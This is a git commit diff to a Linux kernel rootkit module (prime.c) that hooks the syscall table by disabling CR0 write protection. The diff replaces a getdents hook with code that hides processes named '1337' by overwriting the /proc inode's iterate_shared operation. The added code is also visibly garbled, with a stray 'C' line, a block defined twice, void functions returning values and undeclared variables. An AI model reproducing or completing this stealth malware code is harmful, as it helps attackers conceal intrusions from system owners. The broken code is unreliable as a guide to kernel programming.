8138d175525bffb8ef6688bd0ffa946f417c7951
nath <natcastets@icloud.com>
2019-02-06 16:14:37 +0100

    hide fix

--- prime.c
+++ prime.c
@@ -14,13 +14,6 @@ MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");
 static void **sys_call_table;
 static void **ia32_sys_call_table;
 
-asmlinkage long (*real_getdents)(struct pt_regs *);
-
-asmlinkage long fake_getdents(struct pt_regs *regs) {
-  printk(KERN_INFO "sys_getdents hooked");
-  return (*real_getdents)(regs);
-}
-
 asmlinkage long (*real_close)(struct pt_regs *);
 
 asmlinkage long fake_close(struct pt_regs *regs) {
@@ -89,6 +82,105 @@ static void search_sys_call_table(void) {
     printk(KERN_INFO "failed to find ia32_sys_call_table address");
 }
 
+
+
+/* --------------------------------------------------------------------- */
+
+C
+
+static char *proc_to_hide = "1337";
+static struct dir_context *backup_ctx;
+
+static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
+			loff_t off, u64 ino, unsigned int d_type)
+{
+  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
+    return 0;
+
+  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+
+struct dir_context rk_ctx = {
+  .actor = rk_filldir_t,
+};
+
+int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+  int result = 0;
+  rk_ctx.pos = ctx->pos;
+  backup_ctx = ctx;
+  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
+  ctx->pos = rk_ctx.pos;
+
+  return result;
+}
+
+static char *proc_to_hide = "1337";
+static struct dir_context *backup_ctx;
+
+static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
+			loff_t off, u64 ino, unsigned int d_type)
+{
+  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
+    return 0;
+
+  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+
+struct dir_context rk_ctx = {
+  .actor = rk_filldir_t,
+};
+
+int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+{
+  int result = 0;
+  rk_ctx.pos = ctx->pos;
+  backup_ctx = ctx;
+  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
+  ctx->pos = rk_ctx.pos;
+
+  return result;
+}
+
+static struct file_operations backup_fops;
+static struct file_operations new_fops;
+static struct inode proc_inode;
+
+int (*backup_iterate_shared) (struct file *, struct dir_context *);
+
+static void hide_process(pid_t pid) {
+  struct path p;
+
+  if(kern_path("/proc", 0, &p))
+    return 0;
+
+  /* get the inode*/
+  proc_inode = p.dentry->d_inode;
+  
+  /* get a copy of file_operations from inode */
+  proc_fops = *proc_inode->i_fop;
+  /* backup the file_operations */
+  backup_proc_fops = proc_inode->i_fop;
+  /* modify the copy with out evil function */
+  proc_fops.iterate_shared = rk_iterate_shared;
+  /* overwrite the proc entry's file_operations */
+  proc_inode->i_fop = &proc_fops;
+
+  return 0;
+}
+
+static void unhide_process() {
+  /* fetch the proc entry */
+  struct path p;
+
+  if(kern_path("/proc", 0, &p))
+    return;
+
+  /* get inode and restore file_operations */
+  proc_inode = p.dentry->d_inode;
+  proc_inode->i_fop = backup_proc_fops;
+}
+
 static void hook_syscall(void) {
   if (!sys_call_table) {
     printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
@@ -96,13 +188,8 @@ static void hook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
-  
   real_close = sys_call_table[__NR_close];
   sys_call_table[__NR_close] = fake_close;
-  
-  real_getdents = sys_call_table[__NR_getdents];
-  sys_call_table[__NR_getdents] = fake_getdents;
-  
   write_cr0(read_cr0() | 0x10000);
 }
 
@@ -113,10 +200,7 @@ static void unhook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
-  
   sys_call_table[__NR_close] = real_close;
-  sys_call_table[__NR_getdents] = real_getdents;
-  
   write_cr0(read_cr0() | 0x10000);
 }
 
